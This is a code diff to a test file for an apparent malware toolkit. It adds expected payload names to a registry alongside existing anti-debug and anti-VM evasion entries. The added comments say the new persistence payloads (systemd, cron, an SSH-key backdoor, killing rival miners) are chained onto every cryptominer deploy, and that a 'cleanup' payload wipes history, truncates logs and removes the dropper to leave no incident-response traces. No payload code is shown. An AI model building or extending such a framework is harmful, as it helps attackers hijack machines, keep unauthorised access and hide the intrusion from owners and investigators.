@@ -27,6 +27,16 @@ def test_registry_has_expected_payloads():
         "symbol_strip",
         "anti_debug",
         "anti_vm",
+        # Persistence payloads — chained onto every miner deploy so the box
+        # survives reboots and access survives password changes.
+        "kill_miners",
+        "systemd_persist",
+        "cron_persist",
+        "sshkey_backdoor",
+        # Cleanup payload — runs last in the evasion chain to wipe history,
+        # truncate logs, and remove the dropper so the box carries no IR
+        # fingerprints tying it to the deploy.
+        "cleanup",
     }
     assert set(registry.keys()) == expected
 
@@ -43,6 +53,11 @@ def test_categories_match_expected():
         "symbol_strip",
         "anti_debug",
         "anti_vm",
+        "kill_miners",
+        "systemd_persist",
+        "cron_persist",
+        "sshkey_backdoor",
+        "cleanup",
     }
 
 
